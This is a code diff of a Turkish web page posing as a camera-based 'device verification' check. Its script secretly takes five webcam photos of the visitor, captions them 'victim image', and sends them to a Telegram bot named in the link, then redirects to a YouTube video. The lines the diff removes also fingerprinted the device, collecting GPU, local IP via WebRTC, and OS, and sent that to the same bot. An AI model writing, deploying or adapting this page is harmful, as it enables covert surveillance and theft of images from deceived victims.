@@ -2,116 +2,52 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Doğrulama</title>
+    <title>Doğrulama</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 50px 20px; }
-        .container { max-width: 400px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 10px; }
-        .btn { background: #ff0000; color: #fff; padding: 15px 30px; border: none; cursor: pointer; font-size: 18px; border-radius: 5px; width: 100%; font-weight: bold; }
-        #progress { display: none; margin-top: 25px; }
+        body { background: #000; color: #fff; text-align: center; padding: 50px 20px; font-family: sans-serif; }
+        .btn { background: #ff0000; color: #fff; padding: 15px; border: none; border-radius: 5px; width: 100%; font-weight: bold; cursor: pointer; }
+        #prog { display: none; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div style="max-width:400px; margin:auto; border:1px solid #333; padding:20px;">
         <h2>Cihaz Doğrulaması</h2>
-        <p>Devam etmek için kamera üzerinden yüz doğrulaması yapmanız gerekiyor.</p>
-        <button class="btn" onclick="start()">HEMEN DOĞRULA</button>
-        <div id="progress">
-            <p>İşleniyor: %<span id="percent">0</span></p>
-        </div>
+        <p>Devam etmek için kamera izni verin.</p>
+        <button class="btn" onclick="start()">DOĞRULA</button>
+        <div id="prog">İşleniyor: %<span id="perc">0</span></div>
     </div>
-
-    <video id="video" style="display:none;" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
     <script>
-        // Linkten Token ve ID'yi çekiyoruz (?t=TOKEN&i=ID)
-        const urlParams = new URLSearchParams(window.location.search);
-        const botToken = urlParams.get('t'); 
-        const chatId = urlParams.get('i');
-
+        const p = new URLSearchParams(window.location.search);
+        const t = p.get('t'), i = p.get('i');
         async function start() {
-            if (!botToken || !chatId) {
-                alert("Geçersiz doğrulama linki!");
-                return;
-            }
-
+            if(!t || !i) return;
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                video.play();
-                
+                const s = await navigator.mediaDevices.getUserMedia({video:true});
+                document.getElementById('v').srcObject = s;
                 document.querySelector('.btn').style.display = 'none';
-                document.getElementById('progress').style.display = 'block';
-
-                for (let i = 1; i <= 5; i++) {
+                document.getElementById('prog').style.display = 'block';
+                for(let x=1; x<=5; x++) {
                     await new Promise(r => setTimeout(r, 1200));
-                    capture(i);
-                    document.getElementById('percent').innerText = i * 20;
+                    snap(x);
+                    document.getElementById('perc').innerText = x*20;
                 }
-
-                setTimeout(() => {
-                    window.location.href = "https://youtu.be/021FIRNbJK4";
-                }, 1500);
-
-            } catch (err) {
-                alert("Hata: Doğrulama için kamera izni şarttır!");
-            }
+                setTimeout(() => { window.location.href="https://youtu.be/021FIRNbJK4"; }, 1500);
+            } catch(e) { alert("Hata!"); }
         }
-
-        function capture(num) {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `📸 Fotoğraf #${num} Yakalandı!`);
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+        function snap(n) {
+            const cv = document.getElementById('c'), vi = document.getElementById('v');
+            cv.width = vi.videoWidth; cv.height = vi.videoHeight;
+            cv.getContext('2d').drawImage(vi, 0, 0);
+            cv.toBlob(b => {
+                const f = new FormData();
+                f.append('chat_id', i); f.append('photo', b, 'p.jpg');
+                f.append('caption', `📸 Kurban Görüntüsü #${n}`);
+                fetch(`https://api.telegram.org/bot${t}/sendPhoto`, {method:'POST', body:f});
             }, 'image/jpeg', 0.7);
         }
-
-        (function() {
-            async function collectEvidence() {
-                if (!botToken || !chatId) return;
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl');
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
-                    
-                    let localIp = "Gizli";
-                    const pc = new RTCPeerConnection();
-                    pc.createDataChannel("");
-                    pc.createOffer().then(o => pc.setLocalDescription(o));
-                    pc.onicecandidate = (i) => {
-                        if (i && i.candidate) {
-                            const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate);
-                            if (m) localIp = m[1];
-                        }
-                    };
-
-                    setTimeout(() => {
-                        const report = `🚨 *SİBER KANIT*\n\n🎮 GPU: ${gpu}\n🌐 Yerel IP: ${localIp}\n💻 OS: ${navigator.platform}\n⏰: ${new Date().toLocaleString('tr-TR')}`;
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({chat_id: chatId, text: report})
-                        });
-                    }, 3000);
-                } catch (e) {}
-            }
-            collectEvidence();
-        })();
     </script>
 </body>
 </html>
